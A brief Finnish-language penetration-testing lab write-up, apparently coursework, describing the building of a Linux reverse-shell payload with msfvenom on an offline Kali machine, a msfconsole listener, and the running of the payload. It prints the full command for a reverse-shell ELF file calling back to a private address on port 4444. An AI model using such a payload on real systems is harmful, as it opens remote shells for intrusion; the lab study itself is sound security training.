...
Aloitin tehtävän varmistamalla, että Kali ei ole netissä. Sen jälkeen aloin rakentamaan payloadia msfvenomilla. Rakensin komennon, joka luo tiedoston runme.elf, joka sisältää payloadin: -p linux/x64/shell_reverse_tcp LHOST=192.168.148.3. Lopussa määritellään tiedostomuoto elf.
    ...
    msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.148.4 LPORT=4444 -f elf > runme.elf

Seuraavaksi avasin msfconsolen.
...
<img width="auto" alt="image" src="https://github.com/annihuh/tunkeutumistestaus/assets/101214286/eb660516-2e14-4906-8fc0-d39d7103f2c3">
...
Komento määrittää mitä hyötykuormaa, porttia ja hostia Metasploitin täytyy kuunnella.

<img width="auto" alt="image" src="https://github.com/annihuh/tunkeutumistestaus/assets/101214286/8248171f-ff60-45ed-bdd9-5800c697bbc3">

Sen jälkeen ajoin payloadin.
